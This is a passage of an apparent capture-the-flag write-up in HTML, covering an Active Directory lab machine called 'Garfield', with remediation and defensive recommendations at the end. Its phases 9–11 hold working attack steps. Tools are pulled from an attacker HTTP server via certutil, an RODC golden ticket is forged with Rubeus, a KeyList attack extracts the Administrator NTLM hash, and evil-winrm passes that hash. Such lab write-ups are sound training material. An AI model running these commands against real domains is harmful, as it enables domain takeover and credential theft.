+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">10</span><h2>Phase 9: Modify RODC Replication Policy</h2></div>
+    <p><strong>Step 9.1 — Load PowerView on WinRM</strong></p>
+    <pre><code>cd /usr/share/windows-resources/powersploit/Recon/
+python3 -m http.server 8889</code></pre>
+    <pre><code>cd C:\Users\l.wilson_adm\Desktop
+certutil -urlcache -split -f http://&lt;kali vpn&gt;:8889/PowerView.ps1 PowerView.ps1
+Set-ExecutionPolicy Bypass -Scope Process
+Import-Module .\PowerView.ps1</code></pre>
+    <pre><code>(silent success)</code></pre>
+
+    <p><strong>Step 9.2 — Modify Replication Policy</strong></p>
+    <pre><code>Set-DomainObject -Identity RODC01$ -Set @{
+  'msDS-RevealOnDemandGroup'=@(
+    'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb',
+    'CN=Administrator,CN=Users,DC=garfield,DC=htb'
+  )
+}
+Set-DomainObject -Identity RODC01$ -Clear 'msDS-NeverRevealGroup'
+Get-ADComputer RODC01 -Properties msDS-RevealOnDemandGroup,msDS-NeverRevealGroup</code></pre>
+    <pre><code>DistinguishedName        : CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb
+DNSHostName              : RODC01.garfield.htb
+Enabled                  : True
+msDS-RevealOnDemandGroup : {CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb, CN=Administrator,CN=Users,DC=garfield,DC=htb}
+Name                      : RODC01
+ObjectClass              : computer
+ObjectGUID               : 92de2230-7bf6-43b2-baaa-d43bf84f34ea
+SamAccountName           : RODC01$
+SID                      : S-1-5-21-2502726253-3859040611-225969357-1602</code></pre>
+    <p><strong>Why This Matters:</strong> <mark class="rust">The KeyList attack requires the DC to have access to Administrator's credentials from the RODC's replication cache. By adding Administrator to the reveal-on-demand group, we ensure the RODC will provide Administrator's encrypted credentials when queried.</mark></p>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">11</span><h2>Phase 10: Kerberos Golden Ticket + KeyList Attack</h2></div>
+    <p><strong>Step 10.1 — Download Rubeus</strong></p>
+    <pre><code>wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/Rubeus.exe -O /tmp/Rubeus.exe
+cd /tmp
+python3 -m http.server 8890</code></pre>
+    <pre><code>cd C:\Users\l.wilson_adm\Desktop
+certutil -urlcache -split -f http://&lt;kali vpn&gt;:8890/Rubeus.exe Rubeus.exe
+.\Rubeus.exe</code></pre>
+    <pre><code>   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3</code></pre>
+
+    <p><strong>Step 10.2 — Forge RODC Golden Ticket</strong></p>
+    <pre><code>.\Rubeus.exe golden `
+/rodcNumber:8245 `
+/flags:forwardable,renewable,enc_pa_rep `
+/nowrap `
+/outfile:ticket.kirbi `
+/aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 `
+/user:Administrator `
+/id:500 `
+/domain:garfield.htb `
+/sid:S-1-5-21-2502726253-3859040611-225969357</code></pre>
+    <pre><code>[*] Action: Build TGT
+[*] Building PAC
+[*] Domain         : GARFIELD.HTB (GARFIELD)
+[*] SID            : S-1-5-21-2502726253-3859040611-225969357
+[*] UserId         : 500
+[*] Groups         : 520,512,513,519,518
+[*] ServiceKey     : D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240
+[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+[*] KDCKey         : D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240
+[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+[*] Service        : krbtgt
+[*] Target         : garfield.htb
+[*] Generating EncTicketPart
+[*] Signing PAC
+[*] Encrypting EncTicketPart
+[*] Generating Ticket
+[*] Generated KERB-CRED
+[*] Forged a TGT for 'Administrator@garfield.htb'
+[*] AuthTime       : 6/28/2026 5:46:05 PM
+[*] StartTime      : 6/28/2026 5:46:05 PM
+[*] EndTime        : 6/29/2026 3:46:05 AM
+[*] RenewTill      : 7/5/2026 5:46:05 PM
+[*] base64(ticket.kirbi): &lt;base64-encoded KERB-CRED blob&gt;
+[*] Ticket written to ticket_2026_06_29_00_46_05_Administrator_to_krbtgt@GARFIELD.HTB.kirbi</code></pre>
+    <p><strong>Golden Ticket Explained:</strong></p>
+    <ul style="color:var(--text);font-size:0.95rem;">
+      <li><code>/rodcNumber:8245</code> &rarr; Marks this as RODC-issued ticket (critical!)</li>
+      <li><code>/aes256:</code> &rarr; Signed with krbtgt_8245 key</li>
+      <li><code>/user:Administrator /id:500</code> &rarr; Forges Administrator user</li>
+      <li>The ticket is only valid on RODC01, not the primary DC</li>
+      <li>DC will recognize <code>/rodcNumber</code> and trigger special handling</li>
+    </ul>
+
+    <p><strong>Step 10.3 — Perform KeyList Attack</strong></p>
+    <pre><code>.\Rubeus.exe asktgs `
+/enctype:aes256 `
+/keyList `
+/service:krbtgt/garfield.htb `
+/dc:DC01.garfield.htb `
+/ticket:ticket_2026_06_29_00_46_05_Administrator_to_krbtgt@GARFIELD.HTB.kirbi `
+/nowrap</code></pre>
+    <pre><code>[*] Action: Ask TGS
+[*] Requesting 'aes256_cts_hmac_sha1' etype for the service ticket
+[*] Building KeyList TGS-REQ request for: 'Administrator'
+[*] Using domain controller: DC01.garfield.htb
+[+] TGS request successful!
+[*] base64(ticket.kirbi): &lt;base64-encoded KERB-CRED blob&gt;
+  ServiceName              :  krbtgt/GARFIELD.HTB
+  ServiceRealm             :  GARFIELD.HTB
+  UserName                 :  Administrator (NT_PRINCIPAL)
+  UserRealm                :  GARFIELD.HTB
+  StartTime                :  6/28/2026 5:46:24 PM
+  EndTime                  :  6/29/2026 3:46:05 AM
+  RenewTill                :  1/1/0001 12:00:00 AM
+  Flags                    :  name_canonicalize
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  QhgjeNxFRQgkGaFvNf2PDYgchz6bpStmZuw1rdZcgV0=
+  Password Hash            :  EE238F6DEBC752010428F20875B092D5</code></pre>
+    <p><strong>Real Administrator TGT obtained! NTLM hash:</strong> <code>EE238F6DEBC752010428F20875B092D5</code></p>
+    <p><strong>KeyList Mechanism:</strong></p>
+    <ol style="color:var(--text);font-size:0.95rem;">
+      <li>DC01 receives forged RODC ticket (signed by krbtgt_8245)</li>
+      <li>Recognizes <code>/rodcNumber:8245</code> in PAC</li>
+      <li>Performs KeyList lookup: "What credentials does RODC01 have for Administrator?"</li>
+      <li>Retrieves Administrator's encrypted password from RODC replication policy</li>
+      <li>Issues real Administrator TGT signed with primary krbtgt key</li>
+    </ol>
+    <div class="why"><strong>Why this mattered</strong>The KeyList mechanism exists so RODCs can request credentials on a resource's behalf — but it trusts the RODC's signature on the request, not the legitimacy of how that RODC obtained the key it signed with, which is exactly the gap this abuses.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">12</span><h2>Phase 11: Final Compromise</h2></div>
+    <p><strong>Step 11.1 — Sync System Clock (Critical for Kerberos)</strong></p>
+    <pre><code>sudo ntpdate -u &lt;TARGET_IP&gt;</code></pre>
+    <pre><code>2026-06-29 00:28:59.483945 (+0000) +11091.903123 +/- 0.068483 &lt;TARGET_IP&gt; s1 no-leap
+CLOCK: time stepped by 11091.903123</code></pre>
+    <p><strong>Why:</strong> Kerberos is extremely time-sensitive. The initial clock skew of +3h caused failures. NTP sync ensures ticket validation succeeds.</p>
+
+    <p><strong>Step 11.2 — Open Administrator WinRM Shell</strong></p>
+    <pre><code>evil-winrm -i &lt;TARGET_IP&gt; -u Administrator -H 'EE238F6DEBC752010428F20875B092D5'</code></pre>
+    <pre><code>Evil-WinRM shell v3.9
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</code></pre>
+
+    <p><strong>Step 11.3 — Capture Root Flag</strong></p>
+    <pre><code>type C:\Users\Administrator\Desktop\root.txt</code></pre>
+    <div class="flag-row"><span class="flag-label">Root Flag</span><span class="flag-redacted"></span></div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">13</span><h2>Vulnerabilities &amp; CVEs</h2></div>
+
+    <p><strong>1. Active Directory ACL Misconfiguration</strong> — Type: Access Control Weakness · CVSS: High (7.2)</p>
+    <p>Users granted WRITE permission on other user objects (specifically the scriptPath attribute), enabling privilege escalation from a low-privilege user to arbitrary code execution.</p>
+    <p><em>Remediation:</em> Audit AD ACLs regularly (e.g. BloodHound), apply least privilege to ACL assignments, monitor and alert on ACL modifications, use AD audit policies, track scriptPath changes via SIEM.</p>
+
+    <p><strong>2. Logon Script Code Execution (scriptPath)</strong> — Type: Execution via Scheduled Script · CVSS: High (8.1)</p>
+    <p>The AD scriptPath attribute executes scripts automatically on user login with no content validation or sandboxing, enabling RCE as the authenticating user.</p>
+    <p><em>Remediation:</em> Disable scriptPath if unused, restrict via GPO, monitor SYSVOL for unauthorized script changes, use AppLocker/Device Guard, audit logon scripts via GPO.</p>
+
+    <p><strong>3. Machine Account Privilege (SeMachineAccountPrivilege)</strong> — Type: Excessive Privilege Assignment · CVSS: High (7.5)</p>
+    <p>SeMachineAccountPrivilege allows creating up to 10 computer objects by default, enabling RBCD attacks and lateral privilege escalation.</p>
+    <p><em>Remediation:</em> Restrict the privilege to administrative accounts only, monitor computer object creation, lower quotas via Group Policy, audit "Add Workstations to Domain" operations.</p>
+
+    <p><strong>4. RBCD Abuse</strong> — Type: Kerberos Protocol Weakness · CVSS: High (8.1)</p>
+    <p>RBCD allows flexible delegation without SeEnableDelegationPrivilege — write permission on a target object plus a controlled delegating account is enough for privilege escalation via S4U2Proxy.</p>
+    <p><em>Remediation:</em> Restrict write permission on computer objects, monitor PrincipalsAllowedToDelegateToAccount changes, implement Kerberos Armoring, use the Protected Users group, audit S4U2Proxy operations.</p>
+
+    <p><strong>5. RODC Golden Ticket + KeyList Attack</strong> — Type: Kerberos Cryptographic Weakness · CVSS: Critical (9.8)</p>
+    <p>An RODC maintains a separate krbtgt key, and the DC trusts RODC-issued tickets through the KeyList mechanism without validating that the RODC actually issued the ticket — a forged RODC ticket plus a KeyList request yields a real DC ticket.</p>
+    <p><em>Remediation:</em> Secure RODC physical/logical access, monitor for credential extraction attempts, restrict msDS-RevealOnDemandGroup membership, implement PKINIT, monitor /keyList TGS requests, rotate krbtgt keys regularly, monitor LSA access.</p>
+
+    <p><strong>6. Insufficient Clock Skew Tolerance</strong> — Type: Configuration Weakness · CVSS: Medium (5.3)</p>
+    <p>A multi-hour clock skew from the DC forced an NTP sync before Kerberos operations would succeed at all.</p>
+    <p><em>Remediation:</em> Implement NTP synchronization across infrastructure, monitor for skew, use centralized Windows Time Service, alert on skew &gt;5 minutes, secure NTP infrastructure.</p>
+
+    <p><strong>7. Cleartext Credential Storage in Replication</strong> — Type: Cryptographic Weakness · CVSS: High (8.1)</p>
+    <p>The RODC's local password cache is extractable via Mimikatz once SYSTEM is achieved, effectively exposing cached credentials in plaintext-equivalent form.</p>
+    <p><em>Remediation:</em> Use HSM-backed RODC deployments, restrict SYSTEM-level access, keep RODCs off the internet-facing perimeter, enable BitLocker and Credential Guard, monitor RODC access logs.</p>
+
+    <p><strong>8. SID History and PAC Validation Bypass</strong> — Type: Kerberos PAC Weakness · CVSS: Critical (9.8)</p>
+    <p>The Golden Ticket's PAC contains group SID and rights information with no cryptographic binding checked by the RODC ticket path, letting arbitrary group membership and privilege be forged.</p>
+    <p><em>Remediation:</em> Enable KDC PAC validation, PKINIT, and FAST; monitor for tickets with unusual PAC content; track TGT issuance anomalies via AD audit policies.</p>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">14</span><h2>Defensive Recommendations</h2></div>
+    <p><strong>Short-Term (Immediate)</strong></p>
+    <ul style="color:var(--text);font-size:0.95rem;">
+      <li>Audit Active Directory ACLs with BloodHound — identify WRITE permissions on critical objects and review scriptPath attributes on all users</li>
+      <li>Review RODC configuration (msDS-RevealOnDemandGroup / msDS-NeverRevealGroup)</li>
+      <li>Monitor for scriptPath modifications, computer object creation by non-admins, S4U2Proxy requests, and /keyList TGS-REQ operations</li>
+      <li>Rotate krbtgt keys twice, 10+ hours apart, to fully invalidate outstanding tickets</li>
+    </ul>
+    <p><strong>Medium-Term (1–3 months)</strong></p>
+    <ul style="color:var(--text);font-size:0.95rem;">
+      <li>Implement Kerberos hardening: PKINIT, FAST, Kerberos Armoring</li>
+      <li>Audit and tighten all RBCD/delegation configurations</li>
+      <li>Deploy Kerberos-aware SIEM rules and monitor for Mimikatz-style LSA operations</li>
+      <li>Restrict SeMachineAccountPrivilege and adopt Just-In-Time admin access via the Protected Users group</li>
+    </ul>
+    <p><strong>Long-Term (3–12 months)</strong></p>
+    <ul style="color:var(--text);font-size:0.95rem;">
+      <li>Modernize the AD estate (Windows Server 2022+, managed directory services)</li>
+      <li>Move toward a Zero Trust architecture with continuous authentication and network segmentation</li>
+      <li>Build Kerberos attack playbooks and train the SOC on Golden Ticket / KeyList indicators</li>
+    </ul>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">15</span><h2>Conclusion</h2></div>
+    <p>Garfield demonstrates a sophisticated chain of vulnerabilities in Active Directory, Kerberos, and delegated authentication mechanisms. The attack successfully escalates from a low-privilege user to domain administrator by chaining together ACL misconfigurations (scriptPath write), logon script execution, privilege abuse (SeMachineAccountPrivilege), delegation flaws (RBCD), Kerberos weaknesses (Golden Ticket forgery), and replication cache abuse (KeyList attack).</p>
+    <p>The vulnerabilities are not isolated; each enables the next attack in the chain. Defending against such attacks requires defense-in-depth across multiple layers: ACL hardening, Kerberos armoring, privilege restriction, and comprehensive monitoring.</p>
+    <p><strong>Key Takeaway:</strong> A single compromised system (RODC) combined with replication-based trust mechanisms can compromise the entire forest. Organizations must treat RODC security with the same rigor as primary domain controllers.</p>
+  </div>
+<footer>
+  <a href="mailto:burritosec51@gmail.com">burritosec51@gmail.com</a>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  hljs.configure({ languages: ["bash","shell","powershell","python","json","yaml","sql","xml","ini","javascript","php"] });
+  document.querySelectorAll("pre code").forEach((block) => { hljs.highlightElement(block); });
+</script>
+</body>
+</html>
